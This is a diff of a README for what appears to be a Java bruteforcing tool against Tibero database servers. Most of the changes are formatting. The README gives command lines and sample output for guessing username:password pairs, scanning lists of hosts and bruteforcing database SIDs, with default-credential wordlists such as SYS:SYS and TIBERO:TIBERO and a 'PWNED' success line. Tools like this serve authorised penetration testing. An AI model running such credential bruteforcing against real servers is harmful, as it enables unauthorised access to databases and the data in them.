@@ -23,14 +23,23 @@ Tibero first check if username and password exist and only if user exists, check
 
 
 ~/Desktop/tac# ./java -jar tac.jar 127.0.0.1 -upf auth
+
 NO SIDS PROVIDED - BRUTEFORCING USERNAME:PASSWORD
+
 ATTACKING:127.0.0.1:8629
+
 127.0.0.1:8629:TMP:test:test
+
  Login failed: invalid user name or password.   
+ 
 127.0.0.1:8629:TMP:SYS:SYS
+
  Login failed: invalid user name or password.   
+ 
 127.0.0.1:8629:TMP:TIBERO:TIBERO
+
  The requested DB_NAME does not match with the server DB_NAME.    
+ 
 **127.0.0.1:8629:TMP:TIBERO:TIBERO POSSIBLE AUTH FOUND**
 
 
@@ -38,7 +47,9 @@ If username and password was found - **POSSIBLE AUTH FOUND** will be printed.
 File auth contains pair login:password one per line:
 
 test:test
+
 SYS:SYS
+
 TIBERO:TIBERO
 
 Also it is possible to use only one pair with *login:password* like:
@@ -50,24 +61,34 @@ Or scanning multiply hosts
 *./java -jar tac.jar hosts -up test:test*
 
 File **hosts** contains addresses of DB servers with source port:
+
 127.0.0.1:8629
+
 127.0.0.2:8629
 
 #### Bruteforce SID and AUTH ####
 After you obtained valid creds, you can bruteforce DB SID.
+
 *./java -jar tac.jar 127.0.0.1 -sf SIDS -up test:test*
 
 File **SIDS** contains possible DB SIDS one per line:
 
 TEST
+
 DB
+
 WEB
 
-Or you can use only one SID ( using **-s** option )
+Or you can use only one SID (using **-s** option)
+
 root@kali-3:~/Desktop/tac# java -jar tac.jar -s DBA 127.0.0.1 -up TIBERO:TIBERO
+
 LOADED SIDS:1
+
 LOADED AUTH:1
+
 ATTACKING:127.0.0.1:8629
+
 127.0.0.1:8629:DBA:TIBERO:TIBERO=====>PWNED
 
 
